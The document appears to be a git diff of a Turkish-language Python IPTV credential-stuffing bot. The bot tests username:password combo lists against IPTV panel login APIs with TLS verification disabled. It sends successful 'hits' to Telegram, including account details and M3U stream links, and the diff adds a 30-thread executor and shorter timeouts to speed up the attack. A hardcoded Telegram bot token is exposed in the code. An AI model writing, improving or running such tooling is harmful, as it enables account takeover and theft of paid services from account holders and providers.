@@ -3,6 +3,7 @@ import time
 import datetime
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # SSL uyarılarını kapat
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -12,7 +13,7 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"
+    return "IPTV Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"
 
 # --- TELEGRAM AYARLARI ---
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
@@ -40,10 +41,11 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 def m3u_tara_detayli(panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
     try:
-        res = requests.get(api_url, headers=HEADERd, timeout=5, verify=False)
+        res = requests.get(api_url, headers=HEADERd, timeout=4, verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
             veri = str(res.text)
             if '"auth":1' in veri or '"status":"Active"' in veri:
+                print(f"[+] HİT YAKALANDI! Panel: {panel} | User: {user}")
                 
                 try:
                     status = veri.split('status":')[1].split(',')[0].replace('"', '')
@@ -77,13 +79,13 @@ def m3u_tara_detayli(panel, user, pas):
 
                 kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
                 try:
-                    k_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
+                    k_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
                     kanalsayisi = str(k_res.text.count('stream_id'))
                     
-                    v_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
+                    v_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
                     filmsayisi = str(v_res.text.count('stream_id'))
                     
-                    s_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
+                    s_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
                     dizisayisi = str(s_res.text.count('series_id'))
                 except:
                     pass
@@ -91,7 +93,7 @@ def m3u_tara_detayli(panel, user, pas):
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 
                 mesaj = (
-                    f"🟢 <b>IPTV HİT BULUNDU! (Bulut Otonom)</b>\n"
+                    f"🟢 <b>IPTV HİT BULUNDU! (Hızlı Tarayıcı)</b>\n"
                     f"🌐 <b>Ana Host:</b> http://{panel}\n"
                     f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                     f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
@@ -110,9 +112,9 @@ def m3u_tara_detayli(panel, user, pas):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
-    time.sleep(3)
-    telegrama_gonder("🚀 <b>Bulut Otonom Tarayıcı Aktif!</b>\n📂 GitHub'daki panel ve combo dosyaları taranıyor...")
+    print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
+    time.sleep(2)
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Eşzamanlı tarama motoru devreye alındı.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -127,20 +129,21 @@ def arka_plan_tarayici():
                         p_yol = os.path.join(panel_dir, p_dosya)
                         with open(p_yol, 'r', encoding='utf-8', errors='ignore') as pf:
                             for line in pf:
-                                p_clean = line.strip().replace('http://', '').replace('/', '')
+                                p_clean = line.strip().replace('http://', '').rstrip('/')
                                 if p_clean:
                                     paneller.append(p_clean)
 
             if not paneller:
-                paneller = ["ornekpanel.com:8080"] # Yedek panel
+                paneller = ["ornekpanel.com:8080"]
 
-            # Comboları tara ve panellerle eşleştir
+            # Comboları tara ve panellerle eşleştir (Eşzamanlı / Multi-Thread)
             if os.path.exists(combo_dir):
                 for dosya_adi in os.listdir(combo_dir):
                     if dosya_adi.endswith('.txt'):
                         dosya_yolu = os.path.join(combo_dir, dosya_adi)
                         print(f"[i] Taranan combo dosyası: {dosya_adi}")
                         
+                        combolar = []
                         with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                             for line in f:
                                 line = line.strip()
@@ -148,17 +151,27 @@ def arka_plan_tarayici():
                                     parts = line.split(':', 1)
                                     user = parts[0].strip()
                                     pas = parts[1].strip()
-                                    
-                                    # Listeden rastgele veya sırayla bir panel seçip tarıyoruz
-                                    for panel in paneller:
-                                        m3u_tara_detayli(panel, user, pas)
-                                        time.sleep(0.5)
-            
-            print("[i] Tarama turu tamamlandı, 30 dakika sonra tekrar dönecek...")
-            time.sleep(1800)
+                                    if user and pas:
+                                        combolar.append((user, pas))
+
+                        print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
+                        
+                        # ThreadPoolExecutor ile 30 iş parçacığı aynı anda çalışır
+                        with ThreadPoolExecutor(max_workers=30) as executor:
+                            futures = []
+                            for user, pas in combolar:
+                                for panel in paneller:
+                                    futures.append(executor.submit(m3u_tara_detayli, panel, user, pas))
+                            
+                            # Görevlerin tamamlanmasını bekle
+                            for future in as_completed(futures):
+                                pass
+        
+            print("[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
+            time.sleep(600)
         except Exception as e:
             print(f"[!] Tarama döngüsü hatası: {e}")
-            time.sleep(60)
+            time.sleep(30)
 
 if __name__ == '__main__':
     import threading
